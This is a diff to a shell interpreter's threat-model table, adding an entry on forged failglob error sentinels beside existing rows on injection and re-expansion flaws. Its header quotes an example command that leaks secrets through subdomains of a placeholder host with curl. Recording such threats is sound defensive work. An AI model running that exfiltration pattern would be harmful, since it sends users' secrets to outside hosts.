@@ -542,6 +542,7 @@ exfiltration by encoding secrets in subdomains (`curl https://$SECRET.example.co
 | Tool schema `$ref` bypass (TM-INJ-024) | Referenced constraints are skipped before host callback invocation | Resolve local JSON Pointer references; fail closed on invalid references | MITIGATED |
 | Host-bridge argument re-parsing (TM-INJ-025) | A reference bridge joins parsed arguments into a `sh -c` / `cmd /C` script | Launch a concrete executable and pass every caller argument as its own argv value | MITIGATED |
 | Redirect target re-expansion (TM-INJ-026) | `> $v` with a value holding `$(...)` text or a glob | A target is expanded once; zero or several words are `ambiguous redirect` and nothing is written; the result is used literally afterwards | MITIGATED |
+| `failglob` error sentinel forged from script data (TM-INJ-027) | A word expanding to `<NUL>ERR<NUL>…` was read as a failed glob, choosing the exit code, writing its own tail to stderr and abandoning the rest of the line | The refusal travels out of band on the interpreter instead of as a prefix on an expanded word | FIXED |
 
 **Variable Expansion:**
 
